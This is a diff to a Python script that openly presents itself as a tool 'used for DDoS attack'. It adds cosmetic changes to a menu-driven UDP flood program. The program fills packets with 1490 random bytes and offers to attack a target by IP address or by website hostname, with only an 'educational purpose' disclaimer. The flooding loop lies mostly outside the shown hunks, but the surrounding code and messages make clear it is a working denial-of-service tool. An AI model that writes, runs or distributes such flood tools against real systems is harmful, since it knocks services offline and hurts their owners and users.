@@ -5,26 +5,27 @@ import time
 import socket
 import random    
 try:   
-    print(Fore.RED + "\t\t\tWelcome to DDOS Simulator - Distributed Denial of Service Simulator")
-    print(Fore.RED + "\t\t\t===================================================================")
-    print(Fore.LIGHTGREEN_EX+ "\t\t\t\tThis program is used to for DDOS attack")
-    print(Fore.MAGENTA+ "\t\t\t\tAuthor: Muhammad Sami Furqan - Aisoft-co")
-    print(Fore.RED+ "\t\t\t\tVersion: 1.0")  
+    init(convert=True)
+    print(Fore.RED + "\t\t\tWelcome to DDOS Simulator - Distributed Denial of Service Attack Simulator")
+    print(Fore.RED + "\t\t\t==========================================================================")
+    print(Fore.LIGHTGREEN_EX+ "\t\t\t\t\t\tThis program is used for DDoS attack")
+    print(Fore.MAGENTA+ "\t\t\t\t\t      Author: Muhammad Sami Furqan - Aisoft-co")
+    print(Fore.RED+ "\t\t\t\t\t\t\tVersion: 1.1")  
     sleep(5)
     system("cls")
-    print(Fore.RED+ "Disclaimer : This program is made for educational purpose only")
+    print(Fore.RED+ "Disclaimer : This program is made for educational purpose only!")
     print(Fore.RESET)
     while True:
      try:    
          sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
          bytes = random._urandom(1490)
-         askfor = input(Fore.BLUE+"""Select Options:
+         print(f"""{Fore.BLUE}Select Options:
 [A] DDoS using an ip address (If you already have an ip address) - Example [ 111.111.111.1 ] 
 [B] DDoS using host (If you dont have an ip address) - By using website URL [ www.example.com ]
 [C] Get Website IP Address - Example [ www.example.com ]
 [D] Get IP Host Name - Example [ HostName ]
-[E] Exit (Exits the program)
-=> """)
+[E] Exit (Exits the program)""")
+         askfor = input(Fore.BLUE+"""=> """)
          if askfor == "A":     
 
              try:
@@ -63,7 +64,7 @@ try:
 
              except KeyboardInterrupt as exception:
                   print(Fore.RESET)
-                  KeyboardInterrupt == print(f"{Fore.RED}The Attack On {ip} Has Been Stopped - REASON : KeyBoard Interrupt\n")
+                  print(f"{Fore.RED}The Attack Has Been Stopped - REASON : KeyBoard Interrupt\n")
              except socket.gaierror as axs:
                  socket.gaierror == print(f"{Fore.RED}{ip} <-- Wrong Ip address")     
 
@@ -98,7 +99,7 @@ try:
                          port2 = 1
              except KeyboardInterrupt as exception:
                   print(Fore.RESET)
-                  KeyboardInterrupt == print(f"{Fore.RED}The Attack On {ip2} Has Been Stopped - REASON : KeyBoard Interrupt\n")
+                  KeyboardInterrupt == print(f"{Fore.RED}The Attack Has Been Stopped - REASON : KeyBoard Interrupt\n")
              except socket.gaierror:
                  socket.gaierror == print(
                      f"{user13232} <-- Host Not Found + No ip address Found ")
@@ -119,6 +120,8 @@ try:
          elif askfor == "E":
              print("Exiting this program")
              exit()
+         elif askfor == "cls":
+             system("cls")
          else:
              print("Wrong Option Selected!")
      except KeyboardInterrupt as exception:
